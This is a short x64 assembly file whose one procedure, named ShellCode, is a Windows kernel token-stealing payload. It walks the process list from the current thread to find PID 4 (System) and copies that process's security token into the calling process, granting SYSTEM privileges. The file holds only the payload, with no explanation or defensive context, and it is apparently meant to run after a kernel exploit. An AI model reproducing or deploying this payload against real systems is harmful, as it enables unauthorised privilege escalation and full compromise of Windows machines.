.code
ShellCode proc
	mov		rax, gs:[188h]
	mov		rax, [rax+210h]
	mov     rcx, rax
	mov     rdx, 4

findSystemPid:
    mov    rax, [rax+188h]
    sub    rax, 188h
    cmp    [rax+180h], rdx
    jnz findSystemPid

    mov rdx, [rax+0208h]
    mov [rcx+0208h], rdx
    ret

ShellCode endp
end